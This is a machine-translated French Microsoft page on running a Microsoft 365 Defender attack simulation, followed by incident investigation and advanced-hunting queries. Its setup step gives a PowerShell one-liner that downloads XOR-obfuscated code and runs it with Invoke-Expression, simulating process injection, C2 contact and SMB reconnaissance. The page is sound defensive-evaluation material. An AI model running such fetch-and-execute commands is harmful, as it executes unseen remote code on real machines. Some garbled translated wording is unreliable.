---
title: Exécuter vos simulations Microsoft 365 Defender d’attaques
description: Exécutez des simulations d’attaques Microsoft 365 Defender projet pilote pour voir comment il se déroule et est rapidement corrigé.
keywords: Microsoft 365 Defender simulation d’attaque pilote, exécuter une simulation d’attaque pilote Microsoft 365 Defender, simuler des attaques dans Microsoft 365 Defender, projet pilote Microsoft 365 Defender, cybersécurité, menace avancée persistante, sécurité d’entreprise, appareils, appareil, identité, utilisateurs, données, applications, incidents, examen et correction automatisés, recherche avancée
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dolmont
author: DulceMontemayor
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.topic: conceptual
ms.technology: m365d
ms.openlocfilehash: 18dc8158ef3c806e5dac5a01778adebc6eecc1ce
ms.sourcegitcommit: 48195345b21b409b175d68acdc25d9f2fc4fc5f1
ms.translationtype: MT
ms.contentlocale: fr-FR
ms.lasthandoff: 06/30/2021
ms.locfileid: "53230018"
---
# <a name="run-your-microsoft-365-defender-attack-simulations"></a>Exécuter vos simulations Microsoft 365 Defender d’attaques

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]


|[![Planification](../../media/phase-diagrams/1-planning.png)](m365d-pilot-plan.md)<br/>[Planification](m365d-pilot-plan.md)|[![Préparation](../../media/phase-diagrams/2-prepare.png)](prepare-m365d-eval.md)<br/>[Préparation](prepare-m365d-eval.md)|![Simuler une attaque](../../media/phase-diagrams/3-simluate.png)<br/>Simuler une attaque|[![Fermer et synthétiser](../../media/phase-diagrams/4-summary.png)](m365d-pilot-close.md)<br/>[Fermer et synthétiser](m365d-pilot-close.md)|
|--|--|--|--|
|||*Vous êtes là !*||

Vous êtes actuellement en phase de simulation d’attaque.

Après avoir préparé votre environnement pilote, il est temps de tester les fonctionnalités de gestion Microsoft 365 Defender incident et d’examen et de correction automatisés. Nous vous aiderons à simuler une attaque sophistiquée qui exploite des techniques avancées pour les masquer de la détection. L’attaque égrène les sessions SMB (Server Message Block) ouvertes sur les contrôleurs de domaine et récupère les adresses IP récentes des appareils des utilisateurs. Cette catégorie d’attaques n’inclut généralement pas les fichiers déposés sur l’appareil de la victime ; ils se produisent uniquement en mémoire. Ils « se délaient de la région » à l’aide des outils système et d’administration existants et injectent leur code dans les processus système pour masquer leur exécution. Ce comportement leur permet d’éviter la détection et de persister sur l’appareil.

Dans cette simulation, notre exemple de scénario commence par un script PowerShell. Il se peut qu’un utilisateur soit duplié pour l’exécution d’un script. Ou le script peut s’exécuter à partir d’une connexion distante vers un autre ordinateur à partir d’un appareil précédemment infecté ( la personne malveillante tente de se déplacer ultérieurement dans le réseau). La détection de ces scripts peut être difficile, car les administrateurs exécutent souvent des scripts à distance pour effectuer diverses activités administratives.

![Diagramme d’attaque PowerShell sans fichier avec injection de processus et schéma d’attaques SMB](../../media/mtp/mtpdiydiagram.png)

Au cours de la simulation, l’attaque injecte du shellcode dans un processus en apparence plus complexe. Le scénario nécessite l’utilisation de notepad.exe. Nous avons choisi ce processus pour la simulation, mais les attaquants cibleraient probablement un processus système de longue durée, tel que svchost.exe. Le shellcode contacte ensuite le serveur de commande et de contrôle (C2) de l’attaquant pour recevoir des instructions sur la façon de continuer. Le script tente d’exécuter des requêtes de reconnaissance sur le contrôleur de domaine ( DC). La reconnaissance permet à une personne malveillante d’obtenir des informations sur les informations de connexion utilisateur récentes. Une fois que les personnes malveillantes ont ces informations, elles peuvent se déplacer ultérieurement dans le réseau pour obtenir un compte sensible spécifique.

> [!IMPORTANT]
> Pour obtenir des résultats optimaux, suivez les instructions de simulation d’attaque aussi étroitement que possible.

## <a name="simulation-environment-requirements"></a>Conditions requises pour l’environnement de simulation

Étant donné que vous avez déjà configuré votre environnement pilote pendant la phase de préparation, assurez-vous que vous avez deux périphériques pour ce scénario : un périphérique de test et un contrôleur de domaine.

1. Vérifiez que votre client [a activé Microsoft 365 Defender](m365d-enable.md#confirm-that-the-service-is-on).

2. Vérifiez la configuration de votre contrôleur de domaine de test :

   - L’appareil s’exécute Windows Server 2008 R2 ou une version ultérieure.
   - Contrôleur de domaine de test [vers Microsoft Defender pour l’identité et](/azure/security-center/security-center-wdatp) activer la gestion à [distance.](/windows-server/administration/server-manager/configure-remote-management-in-server-manager)
   - Vérifiez que [Microsoft Defender pour l’identité et Microsoft Cloud App Security’intégration](/cloud-app-security/mdi-integration) ont été activés.
   - Un utilisateur test est créé sur votre domaine : aucune autorisation d’administrateur n’est nécessaire.

3. Vérifiez la configuration des périphériques de test :

   1. L’appareil s’Windows 10 version 1903 ou ultérieure.

   1. Le périphérique de test est joint au domaine de test.

   1. [Activer Antivirus Windows Defender](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features). Si vous avez des difficultés à activer Antivirus Windows Defender, consultez cette [rubrique de résolution des problèmes.](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)

   1. Vérifiez que le périphérique de test [est intégré à Microsoft Defender pour le point de terminaison).](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)

Si vous utilisez un client existant et implémentez des groupes d’appareils, créez un groupe d’appareils dédié pour le périphérique de test et faites-le avancer au niveau supérieur de l’expérience de configuration.

## <a name="run-the-attack-scenario-simulation"></a>Exécuter la simulation de scénario d’attaque

Pour exécuter la simulation de scénario d’attaque :

1. Connectez-vous au périphérique de test avec le compte d’utilisateur test.

2. Ouvrez une Windows PowerShell sur le périphérique de test.

3. Copiez le script de simulation suivant :

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > Si vous ouvrez ce document sur un navigateur web, vous pouvez rencontrer des problèmes lors de la copie du texte intégral sans perdre certains caractères ou introduire des coupures de ligne supplémentaires. Téléchargez ce document et ouvrez-le sur Adobe Reader.

4. À l’invite, collez et exécutez le script copié.

> [!NOTE]
> Si vous exécutez PowerShell à l’aide du protocole RDP (Remote Desktop Protocol), utilisez la commande Type Clipboard Text dans le client RDP, car la méthode **CTRL-V** hotkey ou right-click-paste risque de ne pas fonctionner. Les versions récentes de PowerShell n’acceptent parfois pas non plus cette méthode, vous de devez d’abord copier vers Bloc-notes en mémoire, la copier dans la machine virtuelle, puis la coller dans PowerShell.

Quelques secondes plus tard, <i>notepad.exe</i> s’ouvre. Un code d’attaque simulée est injecté dans notepad.exe. Gardez l’instance générée automatiquement Bloc-notes ouverte pour découvrir le scénario complet.

Le code d’attaque simulée tente de communiquer avec une adresse IP externe (simulant le serveur C2), puis de tenter la reconnaissance sur le contrôleur de domaine via SMB.

Un message s’affiche sur la console PowerShell une fois ce script terminé.

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

Pour voir la fonctionnalité Incident et réponse automatisé en action, maintenez le processus notepad.exe ouvert. Les incidents et réponses automatisés arrêtent le processus de Bloc-notes automatique.

## <a name="investigate-an-incident"></a>Examiner un incident

> [!NOTE]
> Avant de vous suivre dans cette simulation, regardez la vidéo suivante pour voir comment la gestion des incidents vous aide à rassembler les alertes associées dans le cadre du processus d’examen, où vous pouvez la trouver dans le portail et comment elle peut vous aider dans vos opérations de sécurité :

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

Si vous basculez vers le point de vue de l’analyste SOC, vous pouvez maintenant commencer à examiner l’attaque dans le portail Microsoft 365 centre de sécurité.

1. Ouvrez la [file d Microsoft 365 incident du portail](https://security.microsoft.com/incidents) du Centre de sécurité à partir de n’importe quel appareil.

2. Accédez **à Incidents** à partir du menu.

    ![Capture d’écran des incidents comme illustré dans Microsoft 365 menu gauche du Centre de sécurité](../../media/mtp/fig1.png)

3. Le nouvel incident pour l’attaque simulée s’affiche dans la file d’attente des incidents.

    ![Capture d’écran de la file d’attente des incidents](../../media/mtp/fig2.png)

### <a name="investigate-the-attack-as-a-single-incident"></a>Examiner l’attaque en tant qu’incident unique

Microsoft 365 Defender corréle les analyses et regroupe toutes les alertes et enquêtes associées de différents produits en une seule entité d’incident. Ce faisant, Microsoft 365 Defender présente un scénario d’attaque plus large, ce qui permet à l’analyste SOC de comprendre et de répondre aux menaces complexes.

Les alertes générées au cours de cette simulation sont associées à la même menace et, par conséquent, sont automatiquement agrégées en tant qu’incident unique.

Pour afficher l’incident :

1. Accédez à la **file d’attente Incidents.**

   ![Capture d’écran des incidents dans le menu de navigation](../../media/mtp/fig1.png)

2. Sélectionnez le dernier élément en cliquant sur le cercle situé à gauche du nom de l’incident. Un panneau latéral affiche des informations supplémentaires sur l’incident, y compris toutes les alertes associées. Chaque incident possède un nom unique qui le décrit en fonction des attributs des alertes qu’il inclut.

   ![Capture d’écran de la page incidents où les alertes générées sont agrégées pendant la simulation](../../media/mtp/fig4.png)

   Les alertes qui s’afficheront dans le tableau de bord peuvent être filtrées en fonction des ressources de service : Microsoft Defender pour l’identité, Microsoft Cloud App Security, Microsoft Defender pour le point de terminaison, Microsoft 365 Defender et Microsoft Defender pour Office 365.

3. Sélectionnez **Ouvrir la page Incident** pour obtenir plus d’informations sur l’incident.

   Dans la page **Incident,** vous pouvez voir toutes les alertes et informations relatives à l’incident. Les informations incluent les entités et les ressources impliquées dans l’alerte, la source de détection des alertes (Microsoft Defender pour l’identité, PEPT) et la raison pour laquelle elles ont été liées. L’examen de la liste d’alertes d’incident indique la progression de l’attaque. À partir de cette vue, vous pouvez voir et examiner les alertes individuelles.

   Vous pouvez également cliquer sur **Gérer l’incident** à partir du menu droit pour marquer l’incident, l’affecter à vous-même et ajouter des commentaires.

   ![Capture d’écran de l’endroit où cliquer sur Gérer l’incident](../../media/mtp/fig5a.png)

   ![Capture d’écran des champs du panneau Gérer l’incident où vous pouvez baliser l’incident, l’affecter à vous-même et ajouter des commentaires](../../media/mtp/fig5b.png)

### <a name="review-generated-alerts"></a>Passer en revue les alertes générées

Examinons quelques-unes des alertes générées pendant l’attaque simulée.

> [!NOTE]
> Nous n’allons passer en détail que quelques-unes des alertes générées pendant l’attaque simulée. Selon la version de Windows et les produits Microsoft 365 Defender en cours d’exécution sur votre périphérique de test, vous pouvez voir d’autres alertes qui s’affichent dans un ordre légèrement différent.

![Capture d’écran des alertes générées](../../media/mtp/fig6.png)

#### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint-edr"></a>Alerte : injection de processus suspect observée (Source : Microsoft Defender pour endpoint PEPT)

Les attaquants avancés utilisent des méthodes sophistiquées et sophistiquées pour persister en mémoire et masquer les outils de détection. Une technique courante consiste à opérer à partir d’un processus système approuvé plutôt qu’à un exécutable malveillant, ce qui rend difficile pour les outils de détection et les opérations de sécurité de repérer le code malveillant.

Pour permettre aux analystes SOC de capturer ces attaques avancées, les capteurs de mémoire profonde dans Microsoft Defender pour Endpoint fournissent à notre service cloud une visibilité sans précédent sur diverses techniques d’injection de code entre processus. La figure suivante montre comment Defender pour point de terminaison a détecté et alerté sur la tentative d’injection de code <i>notepad.exe</i>.

![Capture d’écran de l’alerte pour l’injection de code potentiellement malveillant](../../media/mtp/fig7.png)

#### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint-edr"></a>Alerte : comportement inattendu observé par un processus exécuté sans argument de ligne de commande (Source : Microsoft Defender pour endpoint PEPT)

Les détections de Microsoft Defender pour les points de terminaison ciblent souvent l’attribut le plus courant d’une technique d’attaque. Cette méthode garantit la dulité et fait monter la barre pour que les attaquants basculent vers des tactiques plus nouvelles.

Nous employons des algorithmes d’apprentissage à grande échelle pour établir le comportement normal des processus courants au sein d’une organisation et dans le monde entier et nous regardons quand ces processus montrent des comportements anormaux. Ces comportements anormaux indiquent souvent que du code superflu a été introduit et s’exécute dans un processus autrement approuvé.

Dans ce scénario, le <i> processus </i>notepad.exeprésente un comportement anormal, impliquant une communication avec un emplacement externe. Ce résultat est indépendant de la méthode spécifique utilisée pour introduire et exécuter le code malveillant.

> [!NOTE]
> Étant donné que cette alerte est basée sur des modèles d’apprentissage automatique qui nécessitent un traitement principal supplémentaire, il peut prendre un certain temps avant que cette alerte ne s’y trouve dans le portail.

Notez que les détails de l’alerte incluent l’adresse IP externe, un indicateur que vous pouvez utiliser comme tableau croisé dynamique pour développer l’examen.

Sélectionnez l’adresse IP dans l’arborescence du processus d’alerte pour afficher la page des détails de l’adresse IP.

![Capture d’écran de l’alerte pour un comportement inattendu d’un processus exécuté sans argument de ligne de commande](../../media/mtp/fig8.png)

La figure suivante affiche la page de détails de l’adresse IP sélectionnée (en cliquant sur l’adresse IP dans l’arborescence du processus d’alerte).
![Capture d’écran de la page de détails de l’adresse IP](../../media/mtp/fig9.png)

#### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a>Alerte : Reconnaissance des utilisateurs et des adresses IP (SMB) (Source : Microsoft Defender pour l’identité)

L’éumération à l’aide du protocole SMB (Server Message Block) permet aux personnes malveillantes d’obtenir des informations récentes sur l’utilisateur qui les aident à se déplacer ultérieurement sur le réseau pour accéder à un compte sensible spécifique.

Dans cette détection, une alerte est déclenchée lorsque l’éumération de session SMB s’exécute sur un contrôleur de domaine.

![Capture d’écran de l’alerte Microsoft Defender pour l’identité pour la reconnaissance d’adresses IP et utilisateur](../../media/mtp/fig10.png)

### <a name="review-the-device-timeline-microsoft-defender-for-endpoint"></a>Passer en revue la chronologie de l’appareil [Microsoft Defender pour point de terminaison]

Après avoir examiné les différentes alertes de cet incident, revenir à la page d’incident que vous avez examinée précédemment. Sélectionnez **l’onglet** Appareils dans la page Incident pour passer en revue les appareils impliqués dans cet incident, comme indiqué par Microsoft Defender pour le point de terminaison et Microsoft Defender pour l’identité.

Sélectionnez le nom de l’appareil sur lequel l’attaque a eu lieu, pour ouvrir la page d’entité pour cet appareil spécifique. Dans cette page, vous pouvez voir les alertes déclenchées et les événements connexes.

Sélectionnez **l’onglet** Chronologie pour ouvrir la chronologie de l’appareil et afficher tous les événements et comportements observés sur l’appareil dans l’ordre chronologique, entrecoupés des alertes.

![Capture d’écran de la chronologie de l’appareil avec des comportements](../../media/mtp/fig11.png)

Le développement de certains comportements plus intéressants fournit des détails utiles, tels que les arbre de processus.

Par exemple, faites défiler vers le bas jusqu’à ce que vous trouviez **l’événement d’alerte d’injection de processus suspect observé.** Sélectionnez le **powershell.exe** injecté dans notepad.exe événement de processus sous celui-ci, pour afficher l’arborescence de processus complète pour ce comportement sous le graphique **Entités** d’événements dans le volet latéral. Utilisez la barre de recherche pour le filtrage si nécessaire.

![Capture d’écran de l’arborescence de processus pour le comportement de création de fichier PowerShell sélectionné](../../media/mtp/fig12.png)

### <a name="review-the-user-information-microsoft-cloud-app-security"></a>Passer en revue les informations utilisateur [Microsoft Cloud App Security]

Dans la page Incident, sélectionnez **l’onglet Utilisateurs** pour afficher la liste des utilisateurs impliqués dans l’attaque. Le tableau contient des informations supplémentaires sur chaque utilisateur, y compris le score de priorité d’examen **de chaque** utilisateur.

Sélectionnez le nom d’utilisateur pour ouvrir la page de profil de l’utilisateur dans laquelle une enquête plus approfondie peut être menée. [En savoir plus sur l’étude des utilisateurs à risque.](/cloud-app-security/tutorial-ueba#identify)

![Capture d’écran Sécurité des applications cloud page de l’utilisateur](../../media/mtp/fig13.png)

## <a name="automated-investigation-and-remediation"></a>Investigation et résolution automatiques

> [!NOTE]
>Avant de vous suivre dans cette simulation, regardez la vidéo suivante pour vous familiariser avec ce qu’est la auto-ressource automatisée, où la trouver dans le portail et comment elle peut vous aider dans vos opérations de sécurité :

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

Revenir à l’incident dans le portail Microsoft 365 centre de sécurité. **L’onglet** Enquêtes de la page **Incident** affiche les enquêtes automatisées déclenchées par Microsoft Defender pour l’identité et Microsoft Defender pour le point de terminaison. La capture d’écran ci-dessous affiche uniquement l’examen automatisé déclenché par Defender for Endpoint. Par défaut, Defender pour le point de terminaison remédie automatiquement aux artefacts trouvés dans la file d’attente, ce qui nécessite une correction.

![Capture d’écran des enquêtes automatisées liées à l’incident](../../media/mtp/fig14.png)

Sélectionnez l’alerte qui a déclenché un examen pour ouvrir la page **Détails de l’examen.** Vous verrez les détails suivants :

- Alerte qui a déclenché l’examen automatisé.
- Utilisateurs et appareils touchés. Si des indicateurs sont trouvés sur des appareils supplémentaires, ces appareils supplémentaires sont également répertoriés.
- Liste des preuves. Les entités trouvées et analysées, telles que les fichiers, les processus, les services, les pilotes et les adresses réseau. Ces entités sont analysées pour les relations possibles avec l’alerte et sont classés comme étant anodins ou malveillants.
- Menaces trouvées. Menaces connues trouvées pendant l’enquête.

> [!NOTE]
> Selon le délai, l’enquête automatisée est peut-être en cours d’exécution. Patientez quelques minutes avant de collecter et d’analyser les preuves et de passer en revue les résultats. Actualisez la page **Détails de l’examen** pour obtenir les dernières conclusions.

![Capture d’écran de la page Détails de l’examen](../../media/mtp/fig15.png)

Au cours de l’examen automatisé, Microsoft Defender pour le point de terminaison a identifié le processus notepad.exe, qui a été injecté en tant qu’un des artefacts nécessitant une correction. Defender pour le point de terminaison arrête automatiquement l’injection de processus suspect dans le cadre de la correction automatisée.

Vous pouvez <i> voir </i>notepad.exedisparaître de la liste des processus en cours d’exécution sur le périphérique de test.

## <a name="resolve-the-incident"></a>Résoudre l’incident

Une fois que l’examen est terminé et que la correction a été confirmée, fermez l’incident.

Sélectionnez **Gérer l’incident.** Définissez l’état sur **Résoudre l’incident** et sélectionnez la classification pertinente.

Lorsque l’incident est résolu, il ferme toutes les alertes associées dans Microsoft 365 centre de sécurité et dans les portails associés.

![Capture d’écran de la page Incidents avec le panneau Gérer les incidents ouvert dans lequel vous pouvez cliquer sur le commutateur pour résoudre l’incident](../../media/mtp/fig16.png)

Cette opération termine la simulation d’attaque pour les scénarios de gestion des incidents et d’examen et de correction automatisés. La simulation suivante vous permettra de faire une recherche proactive de menaces pour les fichiers potentiellement malveillants.

## <a name="advanced-hunting-scenario"></a>Scénario de recherche avancée

> [!NOTE]
> Avant de vous suivre dans la simulation, regardez la vidéo suivante pour comprendre les concepts de recherche avancés, voir où vous pouvez le trouver dans le portail et savoir comment cela peut vous aider dans vos opérations de sécurité :

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bp7O]

### <a name="hunting-environment-requirements"></a>Conditions requises pour l’environnement de recherche

Un seul périphérique et boîte aux lettres interne est requis pour ce scénario. Vous aurez également besoin d’un compte de messagerie externe pour envoyer le message de test.

1. Vérifiez que votre client a [activé Microsoft 365 Defender](m365d-enable.md#confirm-that-the-service-is-on).
2. Identifiez une boîte aux lettres cible à utiliser pour recevoir des messages électroniques.
    a. Cette boîte aux lettres doit être surveillée par Microsoft Defender pour Office 365 b. L’appareil de la condition 3 doit accéder à cette boîte aux lettres
3. Configurez un périphérique de test : a. Assurez-vous que vous utilisez Windows 10 version 1903 ou ultérieure.
    b. Associez le périphérique de test au domaine de test.
    c. [Activer Antivirus Windows Defender](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features). Si vous avez des difficultés à activer Antivirus Windows Defender, consultez [cette rubrique de résolution des problèmes.](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)
    d. [Intégration à Microsoft Defender pour point de terminaison.](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)

### <a name="run-the-simulation"></a>Exécuter la simulation

1. À partir d’un compte de messagerie externe, envoyez un courrier électronique à la boîte aux lettres identifiée à l’étape 2 de la section conditions requises pour l’environnement de test. Inclure une pièce jointe qui sera autorisée par le biais de toutes les stratégies de filtrage de courrier électronique existantes. Ce fichier n’a pas besoin d’être malveillant ou exécutable. Les types de fichiers <i>suggérés sont.pdf, </i> <i>.exe</i> (si autorisé) ou Office document tel qu’un fichier Word.
2. Ouvrez le courrier électronique envoyé à partir de l’appareil configuré comme défini à l’étape 3 de la section configuration requise de l’environnement de test. Ouvrez la pièce jointe ou enregistrez le fichier sur l’appareil.

#### <a name="go-hunting"></a>Aller au chasse

1. Ouvrez le security.microsoft.com web.

2. Accédez **à Hunting > Advanced Hunting**.

   ![Capture d’écran du hunting avancé dans la barre de navigation du portail du Centre de sécurité M365](../../media/mtp/fig17.png)

3. Créez une requête qui commence par collecter des événements de courrier électronique.

   1. Dans le volet de requête, sélectionnez Nouveau.

   1. Double-cliquez sur la table EmailEvents à partir du schéma.

      ```console
      EmailEvents
      ```

   1. Modifiez la période pour les dernières 24 heures. En supposant que l’e-mail que vous avez envoyé lorsque vous avez lancé la simulation ci-dessus se trouvait au cours des dernières 24 heures, sinon, modifiez la période.

      ![Capture d’écran de l’endroit où vous pouvez modifier la période. Ouvrez le menu déroulant pour choisir parmi une plage d’options de période](../../media/mtp/fig18.png)

   1. Exécutez la requête. Vous pouvez obtenir de nombreux résultats en fonction de l’environnement du pilote.

      > [!NOTE]
      > Consultez l’étape suivante pour les options de filtrage pour limiter le retour de données.

      ![Capture d’écran des résultats de requête de recherche avancée](../../media/mtp/fig19.png)

        > [!NOTE]
        > Le recherche avancée affiche les résultats de la requête sous la mesure de données tabulaires. Vous pouvez également choisir d’afficher les données dans d’autres types de formats tels que les graphiques.

   1. Consultez les résultats et déterminez si vous pouvez identifier l’e-mail que vous avez ouvert. L’exposition du message dans un recherche avancée peut prendre jusqu’à 2 heures. Si l’environnement de messagerie est de grande taille et qu’il y a de nombreux résultats, vous pouvez utiliser **l’option** Afficher les filtres pour rechercher le message.

      Dans l’exemple, le courrier électronique a été envoyé à partir d’un compte Yahoo. Cliquez sur l’icône yahoo.com sous la **+** section SenderFromDomain,  puis cliquez sur Appliquer pour ajouter le domaine sélectionné à la requête.  Utilisez le domaine ou le compte de messagerie utilisé pour envoyer le message de test à l’étape 1 de l’étape Exécuter la simulation pour filtrer vos résultats. Exécutez à nouveau la requête pour obtenir un jeu de résultats plus petit pour vérifier que vous voyez le message de la simulation.

      ![Capture d’écran des filtres. Utilisez des filtres pour affiner la recherche et trouver ce que vous recherchez plus rapidement.](../../media/mtp/fig20.png)

      ```console
      EmailEvents
      | where SenderMailFromDomain == "yahoo.com"
      ```

   1. Cliquez sur les lignes résultantes de la requête pour pouvoir inspecter l’enregistrement.

      ![Capture d’écran du panneau latéral Inspecter l’enregistrement qui s’ouvre lorsqu’un résultat de recherche avancé est sélectionné](../../media/mtp/fig21.png)

4. Maintenant que vous avez vérifié que vous pouvez voir le message électronique, ajoutez un filtre pour les pièces jointes. Concentrez-vous sur tous les e-mails avec pièces jointes dans l’environnement. Dans ce scénario, concentrez-vous sur les e-mails entrants, et non sur ceux envoyés à partir de votre environnement. Supprimez les filtres que vous avez ajoutés pour localiser votre message et ajoutez « | où **AttachmentCount > 0** et **EmailDirection**  ==  **« Entrant »**

   La requête suivante affiche le résultat avec une liste plus courte que votre requête initiale pour tous les événements de courrier électronique :

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   ```

5. Ensuite, incluez les informations sur la pièce jointe (telles que : nom de fichier, hèses) à votre jeu de résultats. Pour ce faire, joignez la table **EmailAttachmentInfo.** Les champs communs à utiliser pour la jointage, dans ce cas sont **NetworkMessageId** et **RecipientObjectId**.

   La requête suivante inclut également une ligne supplémentaire « | **renommez emailTimestamp=Timestamp**« qui vous aidera à identifier l’timestamp qui était lié à l’e-mail par rapport aux timestamps liés aux actions de fichier que vous ajouterez à l’étape suivante.

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   ```

6. Ensuite, utilisez la valeur **SHA256** de la table **EmailAttachmentInfo** pour rechercher **DeviceFileEvents** (actions de fichier qui se sont produites sur le point de terminaison) pour ce hachage. Le champ commun ici sera le hachage SHA256 pour la pièce jointe.

   Le tableau qui en résulte inclut désormais les détails du point de terminaison (Microsoft Defender pour endpoint) tels que le nom de l’appareil, l’action effectuée (dans ce cas, filtrée pour inclure uniquement les événements FileCreated) et l’endroit où le fichier a été stocké. Le nom de compte associé au processus sera également inclus.

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   | join DeviceFileEvents on SHA256
   | where ActionType == "FileCreated"
   ```

   Vous avez maintenant créé une requête qui identifiera tous les e-mails entrants dans lequel l’utilisateur a ouvert ou enregistré la pièce jointe. Vous pouvez également affiner cette requête pour filtrer des domaines d’expéditeur, des tailles de fichiers, des types de fichiers, etc. spécifiques.

7. Les fonctions sont un type spécial de jointage, qui vous permet de tirer plus de données TI sur un fichier comme sa prévalence, les informations sur le signataire et l’émetteur, etc. Pour obtenir plus de détails sur le fichier, utilisez l’enrichissement de fonction **FileProfile()** :

    ```console
    EmailEvents
    | where AttachmentCount > 0 and EmailDirection == "Inbound"
    | project-rename EmailTimestamp=Timestamp
    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
    | join DeviceFileEvents on SHA256
    | where ActionType == "FileCreated"
    | distinct SHA1
    | invoke FileProfile()
    ```

#### <a name="create-a-detection"></a>Créer une détection

Une fois que vous avez créé une requête qui  identifie les informations dont vous souhaitez être averti s’ils se produisent à l’avenir, vous pouvez créer une détection personnalisée à partir de la requête.

Les détections personnalisées exécutent la requête en fonction de la fréquence que vous avez définie, et les résultats des requêtes créent des alertes de sécurité, en fonction des ressources impactées que vous choisissez. Ces alertes sont corrélées aux incidents et peuvent être triées comme n’importe quelle autre alerte de sécurité générée par l’un des produits.

1. Dans la page de requête, supprimez les lignes 7 et 8 qui ont été ajoutées à l’étape 7 des instructions de repérage d’aller, puis cliquez sur Créer **une règle de détection.**

   ![Capture d’écran de l’endroit où vous pouvez cliquer pour créer une règle de détection dans la page de repérage avancé](../../media/mtp/fig22.png)

   > [!NOTE]
   > Si vous cliquez **sur Créer une règle de détection** et que vous avez des erreurs de syntaxe dans votre requête, votre règle de détection ne sera pas enregistrée. Vérifiez votre requête pour vous assurer qu’il n’y a aucune erreur.

2. Remplissez les champs requis avec les informations qui permettront à l’équipe de sécurité de comprendre l’alerte, pourquoi elle a été générée et les actions que vous attendez qu’elle prenne.

   ![Capture d’écran de la page créer une règle de détection dans laquelle vous pouvez définir les détails de l’alerte](../../media/mtp/fig23.png)

   Veillez à remplir les champs avec clarté pour aider l’utilisateur suivant à prendre une décision éclairée sur cette alerte de règle de détection.

3. Sélectionnez les entités qui sont impactées dans cette alerte. Dans ce cas, sélectionnez **Appareil** et boîte aux **lettres.**

   ![Capture d’écran de la page créer une règle de détection dans laquelle vous pouvez choisir les paramètres des entités impactées](../../media/mtp/fig24.png)

4. Déterminez les actions à prendre si l’alerte est déclenchée. Dans ce cas, exécutez une analyse antivirus, même si d’autres actions peuvent être prises.

   ![Capture d’écran de la page créer une règle de détection dans laquelle vous pouvez exécuter une analyse antivirus lorsqu’une alerte est déclenchée pour aider à résoudre les menaces](../../media/mtp/fig25.png)

5. Sélectionnez l’étendue de la règle d’alerte. Étant donné que cette requête implique des appareils, les groupes d’appareils sont pertinents dans cette détection personnalisée en fonction du contexte de point de terminaison Microsoft Defender. Lors de la création d’une détection personnalisée qui n’inclut pas les appareils en tant qu’entités touchées, l’étendue ne s’applique pas.

   ![Capture d’écran de la page créer une règle de détection dans laquelle vous pouvez définir l’étendue de la règle d’alerte pour gérer vos attentes en matière de résultats que vous verrez](../../media/mtp/fig26.png)

   Pour ce projet pilote, vous pouvez limiter cette règle à un sous-ensemble d’appareils de test dans votre environnement de production.

6. Sélectionnez **Créer**. Sélectionnez ensuite **des règles de détection personnalisées** dans le panneau de navigation.

   ![Capture d’écran de l’option Règles de détection personnalisées dans le menu](../../media/mtp/fig27a.png)

   ![Capture d’écran de la page des règles de détection qui affiche les détails de la règle et de l’exécution](../../media/mtp/fig27b.png)

   À partir de cette page, vous pouvez sélectionner la règle de détection, qui ouvre une page de détails.

   ![Capture d’écran de la page de pièces jointes d’e-mail dans laquelle vous pouvez voir l’état de l’exécution de la règle, les alertes et actions déclenchées, modifier la détection, et ainsi de suite](../../media/mtp/fig28.png)

### <a name="additional-advanced-hunting-walk-through-exercises"></a>Exercices de recherche avancée supplémentaires

Pour en savoir plus sur le repérage avancé, les webcasts suivants vous feront découvrir les fonctionnalités de repérage avancé au sein de Microsoft 365 Defender pour créer des requêtes entre piliers, pivoter sur des entités et créer des détections et des actions de correction personnalisées.

> [!NOTE]
> Soyez préparé avec votre propre compte GitHub pour exécuter les requêtes de recherche dans votre environnement de laboratoire de test pilote.

|Titre|Description|Télécharger MP4|Regarder sur YouTube|Fichier CSL à utiliser|
|---|---|---|---|---|
